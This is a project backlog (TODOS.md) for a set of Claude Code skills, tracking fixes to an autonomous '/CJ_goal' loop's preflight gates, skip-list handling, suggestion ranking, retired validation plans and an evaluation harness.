**When:** before the next /loop /CJ_goal session that needs to drain a backlog containing any sensitive-surface-touching rows. The current workaround is to manually edit `/tmp/cj-goal-skip-${RUN_ID}.txt` before re-invoking, which is fine for one-off but doesn't scale.

**Reference:** observed live in `/loop /CJ_goal` session 2026-05-15 ~00:00 UTC after iter 7 shipped PR #114.

### ~~`/CJ_goal` preflight: design-needed regex misses `/office-hours from`, `Re-do`, and similar "needs design rework" patterns (P3, S)~~ DONE — closed by S000044 (v3.6.5, PR #122) via Gate 5 regex extension: now matches `redesign|re-?do|re-?ground|rewrite|rescope|/office-hours`
Observed 2026-05-15 in `/loop /CJ_goal` iter 3 after the v3.6.x bundle + TODOS hygiene cleanup PRs landed. The script picked TODOS:85 (T000031 `Re-do brief-mode for /CJ_personal-pipeline against auto-only main, P2/M`) as the next iteration. Preflight passed (`IDEMPOTENT_SKIP=0`, no design-keyword match) but the body's step (1) literally says: "`/office-hours` from a new worktree with the closed-PR design as starting context." That's an explicit design-rework signal that should have halted preflight at gate 5, not been auto-dispatched. **Root cause:** `goal.sh` line ~300 design-needed regex (`needs design|figure out|investigate|spike|unclear|need to decide|TBD`) doesn't include `/office-hours`, `Re-do`, `re-ground`, or similar phrasings that imply re-design, not implementation. **Fix sketch:** extend the regex to include these patterns OR add a separate "step 1 mentions /office-hours" body scan. Test against TODOS:85 before/after — should halt at preflight after the fix. **Reference:** observed live in /loop /CJ_goal third iteration on 2026-05-15 after PR #120 (v3.6.3) merged. Compounds with the sensitive-surface markdown gap below — both surfaced in the same iteration.

### ~~`/CJ_goal` preflight: sensitive-surface regex catches `skills/*/scripts/` but NOT `skills/*/*.md` (P3, S)~~ DONE — closed by S000044 (v3.6.5, PR #122) via Gate 4 regex extension: added `skills/[^/]+/.+\.md` to catch SKILL.md, pipeline.md, scaffold.md, implement.md, etc.
Observed 2026-05-15 in same `/loop /CJ_goal` iter 3 (T000031 pick). The regex at `goal.sh:289` catches script files under `skills/[^/]+/scripts/` but does NOT catch markdown skill definition files like `skills/CJ_personal-pipeline/pipeline.md` or any `skills/*/SKILL.md`. Editing skill markdown is just as load-bearing as editing skill scripts — both control runtime behavior — yet `/CJ_goal` would auto-dispatch a TODO that touches `pipeline.md` without any human gate. T000031 (which targets `/CJ_personal-pipeline`) didn't trip the sensitive-surface gate even though "Re-do brief-mode" implies pipeline.md edits. **Fix sketch:** extend the regex to include `skills/[^/]+/(SKILL|pipeline)\.md|skills/[^/]+/[a-z-]+\.md` (any markdown under any skill dir). Stricter alternative: catch any path under `skills/[^/]+/` regardless of extension — but that may over-trigger on benign README touches. Pick the targeted-extension version. **When:** before the next /CJ_goal-eligible TODO that touches a skill's markdown surface lands in TODOS.md. **Reference:** observed live in /loop /CJ_goal third iteration on 2026-05-15 after PR #120 (v3.6.3) merged. Pairs with the design-needed regex gap above — could ship together as a single small `/CJ_goal preflight v1.2 polish` PR.

### `/CJ_goal` skip-list file occasionally resets between invocations under `/loop` (P3, S)
Observed 2026-05-15 in same `/loop` session. The per-session skip-list at `/tmp/cj-goal-skip-${RUN_ID}.txt` is supposed to accumulate skipped TODOs across iterations (so /CJ_suggest's post-filter can advance past the queue). Iterations 1-5 wrote to the file correctly (~95 bytes, 2 entries). Iteration 6, with the same `LOOP_SESSION_RUN_ID` env var, saw the file reset to ~47 bytes (1 entry — just the iter-6-skipped row). The user manually re-seeded the file before iter 7 to recover.

Root cause unknown from outside the script. The `>>` append in `scripts/goal.sh:92` shouldn't truncate. Suspects: (a) a code path that recreates the file with `>` instead of `>>`; (b) the pipeline subagent that ran iter 5 used a different RUN_ID internally and wrote elsewhere, leaving the loop-session file un-updated; (c) macOS tmpfile reaping at HH:00 / HH:30 (unlikely on this cadence); (d) `git stash pop` side-effect somehow (mechanism unclear).

**Fix sketch:** instrument `scripts/goal.sh` with an explicit "before-iter skip-file snapshot" log line (`echo "[CJ_goal] skip-file size: $(wc -c < $SKIP_FILE) bytes ($N entries)"` at preflight start). Run a `/loop /CJ_goal` smoke session and grep the logs for size deltas across iterations. Once the truncation event is reproduced, the offending code path will be obvious.

**Workaround:** under `/loop`, manually re-seed the skip-list file before each invocation. Won't scale past v1.

**Reference:** observed live in `/loop /CJ_goal` session 2026-05-15 between iter 5 (PR #113 ship) and iter 6 (P1 re-skip).

### ~~`/CJ_suggest` top-5 limit can exhaust `/CJ_goal` queue when many top ranks are skip-listed (P3, S)~~ DONE — closed by S000042 (v3.6.0, PR #117) via `--for-skill cj-goal --limit 15` flags on /CJ_suggest (also closes the embedded "no /CJ_suggest pre-filter against preflight" sub-item from this row's body)
Observed 2026-05-15 in `/loop /CJ_goal` iter 10. The no-args path of `/CJ_goal` reads `/CJ_suggest` top-1 (with skip-list post-filter applied). `/CJ_suggest` hard-caps output at top-5. When 5+ of those top ranks are in the per-session skip-list — e.g. 2 P1 size-cap rows + 1 sensitive-surface row + 3 meta-`/CJ_goal` polish TODOs all rank above the eligible P4 candidates — the post-filter returns empty and `/CJ_goal` halts at `halted_at_resolve` (terminal STOP per design), even though TODOS.md contains other eligible rows below the top-5 cutoff.

**Repro:** seed `/tmp/cj-goal-skip-*.txt` with the current top-5 of `/CJ_suggest` output; invoke `/CJ_goal` no-args; observe immediate `halted_at_resolve` despite TODOS.md having ~8 more rows that are `/CJ_goal`-eligible (small size, P2-P4, non-sensitive).

**Fix sketch:** two options. (1) Expand `/CJ_suggest` to take an optional `--limit N` flag and have `/CJ_goal` request a deeper window (e.g. top-15) when the post-filter empties the top-5. (2) `/CJ_goal` falls back to scanning TODOS.md directly when `/CJ_suggest` post-filter is empty — applies its own preflight filters in-band rather than relying on /CJ_suggest's ranking. Option 1 is cleaner (single source of ranking truth); option 2 is faster to ship (no /CJ_suggest change).

**Reference:** observed live in `/loop /CJ_goal` session 2026-05-15 iter 10; PRs #110-#114 shipped in same session; skip-list contained 6 entries when the queue exhausted. Compounds with the prior 3 v1.1 polish items above (sensitive-surface auto-decline, skip-list reset, no `/CJ_suggest` pre-filter against preflight) — together they form a coherent v1.1 polish bundle.

### ~~v2: replace pipeline.md:528 validate.sh call with handoff to `/CJ_personal-workflow check` on the scaffolded dir (P3, S)~~ RETIRED
Approach B follow-up from T000028 / Approach D ship. Today `skills/CJ_personal-pipeline/pipeline.md` Step 6 runs `scripts/validate.sh` as a workbench-only check (skipped downstream when absent). The contract-strict version replaces the validate.sh call with a structured handoff block that invokes `/CJ_personal-workflow check "$WORK_ITEM_DIR"` via the Skill tool — same pattern as the dispatch handoff in `skills/CJ_goal/scripts/goal.sh`. Portable by construction (the check skill is markdown-defined and deployed globally), removes the workbench-coupling root cause instead of guarding around it. **When:** if downstream scaffold drift surfaces past the current pipeline gates; v1 (T000028) is fine until then.

**RETIRED:** T000029 / v3.5.6 — after closer inspection of validate.sh coverage (11 workbench-wide invariants) vs /CJ_personal-workflow check (per-work-item structural via templates+manifest), neither approach delivers meaningful improvement over v1 (T000028 / Approach D). Reopen if downstream acquires per-repo catalog/manifest surfaces.

### ~~v2: ship `scripts/validate.sh` (or a scaffold-only subset) via `skills-deploy install` for downstream repos (P3, S)~~ RETIRED
Approach E follow-up from T000028 / Approach D ship. Surfaced by the autoplan CEO review: the cleanest path to "portable" isn't to skip validate.sh downstream, it's to make validate.sh ship with the skill bundle so downstream repos get the structural checks for free. Two flavors to explore: (a) ship the full `validate.sh` (depends on a per-repo skill-catalog being present — currently workbench-only); (b) extract a scaffold-only subset (`validate-work-item <dir>` that runs just the per-work-item structural checks, no skill-catalog/manifest/copilot dependencies) and ship that. Path (b) is the cleaner downstream contract. **When:** if downstream Phase 1 scaffolds start failing in ways the current skip-when-absent guard hides; v1 (T000028) is fine until then.

**RETIRED:** T000029 / v3.5.6 — after closer inspection of validate.sh coverage (11 workbench-wide invariants) vs /CJ_personal-workflow check (per-work-item structural via templates+manifest), neither approach delivers meaningful improvement over v1 (T000028 / Approach D). Reopen if downstream acquires per-repo catalog/manifest surfaces.

### Adopt XML-tag delimited subagent prompts from anthropic-docs (P3, M)

**Source:** https://platform.claude.com/docs/en/build-with-claude/prompt-engineering/claude-prompting-best-practices
**Verdict:** novel
**Affected skills:** skills/CJ_personal-pipeline/SKILL.md, skills/CJ_improve-queue/SKILL.md, skills/CJ_qa-work-item/SKILL.md, skills/CJ_goal_run/SKILL.md
**Suggested change:** Wrap subagent prompt sections (role, task, constraints, inputs, return contract) in named XML tags so subagents parse mixed instructions plus variable inputs unambiguously.
<!-- source-quote: "XML tags help Claude parse complex prompts unambiguously, especially when your prompt mixes instructions, context, examples, and variable inputs." -->
<!-- impr-sig=6b0a15bea5c5e84d impr-conf=7/10 -->

### Adopt concise discovery-focused descriptions from anthropic-docs (P3, M)

**Source:** https://platform.claude.com/docs/en/agents-and-tools/agent-skills/best-practices
**Verdict:** conflict
**Affected skills:** skills/CJ_goal_run/SKILL.md, skills/CJ_goal_todo_fix/SKILL.md, skills/CJ_personal-pipeline/SKILL.md, skills/CJ_qa-work-item/SKILL.md, skills/CJ_implement-from-spec/SKILL.md
**Suggested change:** Rewrite each affected SKILL.md description to lead with what+when in 1-2 sentences and move version-rename history, flag mechanics, and changelog detail into the SKILL.md body or an old-patterns section.
<!-- source-quote: "The description is critical for skill selection: Claude uses it to choose the right Skill from potentially 100+ available Skills." -->
<!-- impr-sig=432d0480aa0d58e5 impr-conf=8/10 -->

## Deferred work

### ~~scripts/migrate-commands.sh (P3, S)~~ RETIRED
Depends on create-skill.sh which was removed. Skills are now created manually via CLAUDE.md guide.

### ~~Template version tracking (P3, S)~~ RETIRED
Superseded by collection versioning. Templates are covered by the collection version.

### ~~Skill authoring harness skill (P1, M)~~ RETIRED
Shipped as v0.1.0, then sunset in v0.2.3. Replaced by /office-hours + implement + /ship workflow.

### ~~Skill authoring enhancements (P3, S)~~ RETIRED
Depends on skill-author which was removed.

### ~~GitHub Actions CI for skill lifecycle (P3, S)~~ RETIRED
Depends on skill-check.sh which was removed. Validation now handled by validate.sh only.

### ~~skill-status.sh dashboard (P3, S)~~ RETIRED
Depends on skill-check.sh which was removed.

### ~~skill-diff.sh version comparison (P3, S)~~ RETIRED
Depends on skill-ship.sh which was removed.

### ~~Add `/docs check` and `/docs tree` to Phase 3 review gates (P2, S)~~ DONE
Already present in all 4 tracker templates. Phase 3 gates include `/docs check` and
`/docs tree` (feature/user-story) or `/docs check` (task/defect).

### ~~Stale example output in check.md and tree.md (P2, S)~~ DONE
Updated examples to show current hierarchy (1 story, 1 task). References to
deleted S000002, S000003, T000002, T000003 replaced.

### ~~Sync global rules with repo-local rules (P2, S)~~ DONE
Run `skills-deploy install --overwrite` to deploy repo-local source. Global rules
now match artifact-manifests.json (features = tracker only, 3-level fallback).

### ~~Template fallback chain inconsistency (P3, S)~~ DONE
Standardized to 3-level chain across all files: check.md, PHILOSOPHY.md, rules,
CLAUDE.md. The `~/.claude/spec/templates/` directory is now checked during validation.

### validate.sh structural check via graph JSON (P2, M)
Add structural completeness check to validate.sh by reading `work-item-graph.json`
badges instead of doing its own YAML parsing. Catches structural violations in
pre-commit, not just when someone runs `/docs check`.
**When:** After graph artifact schema (v1.0.0) is proven stable.
**Depends on:** `.docs/work-item-graph.json` emitted by `/docs check` Steps 15-17.

### ~~Behavioral eval harness (P1, M)~~ DONE-V1
Golden tasks, expected outputs, regression fixtures, safety checks per skill.
Measures whether a skill actually works, not just whether metadata exists.

**Shipped in v1.12.0 (S000023):** `scripts/eval.sh` runner + `tests/eval/lib/{run-case,seed-fixture}.sh` + first passing case (`check-flags-missing-lifecycle` for personal-workflow, $0.10/15s end-to-end). Spike 0 resolved (direct `--plugin-dir` works; schema enforcement is exit-fail). Security hardening (env scrub, symlink rejection, schema $ref lint, aggregate budget cap) baked in.

**Shipped in F000013 follow-ups:**
- ~~**S000024** — V1 case coverage~~ — **shipped in v1.16.1.** 5 personal-workflow cases authored (#2–#6 in `tests/eval/README.md` V1 case index): `check-step18-faithful-comma-split` (S000022 regression), `check-passing-feature` (baseline), `check-missing-frontmatter`, `check-lifecycle-drift`, `check-untested-p0`. Full suite green at $0.99/run, ~72s wall-clock. `check-untested-p0` exhibits ~33% LLM-variance flake (3-run baseline) — nightly CI will surface drift. system-health cases deferred — see V2 trajectory below.
- ~~**S000025** — Nightly CI workflow (`.github/workflows/eval-nightly.yml`)~~ — **workflow + TODOS marker landed (this PR).** Workflow authored: cron daily 09:00 UTC + workflow_dispatch + 15-min timeout + ANTHROPIC_API_KEY secret + npm-installed claude CLI + job-summary surface. Post-ship verification (S000025 ACs 2/3/4/7 — first-run completion, cost/wall-clock observation, tracker journal record, failure-notification path) deferred: V1's 5 cases cover only `check.md`; nightly CI at ~$1/run doesn't justify the cost until V2 adds scaffold/implement/qa cases. Trigger manually before shipping changes to `check.md`.

**V2 trajectory:** runner $HOME-faking (unblocks system-health behavioral cases — current blocker is `tests/eval/lib/run-case.sh` not setting `HOME=$tmpdir` while `system-health` hard-codes `~/.claude/`); scaffold/implement/qa skill cases (need structural-assertion helpers); per-PR cadence with `paths` filter; LLM-judge for prose-quality outputs; sandboxed execution (drop `Bash` from --allowedTools, `env -i`-level scrub); parser-logic unit tests for `check.md` Step 18 in `scripts/check-helpers/parse-traceability.sh` (deterministic regression coverage that closes the S000022 spec-execution gap surfaced in S000024 RC2).

**Reference:** [F000013_eval_harness_v1/](work-items/features/ops/testing/F000013_eval_harness_v1/), source design at `~/.gstack/projects/jcl2018-claude-skills-templates/chjiang-main-design-20260509-110013.md`.

### ~~Batch version mode for multi-skill commits (P3, S)~~ SIMPLIFIED
Simplified by collection versioning. Use `collection-version.sh bump patch`.
**Depends on:** collection-version.sh

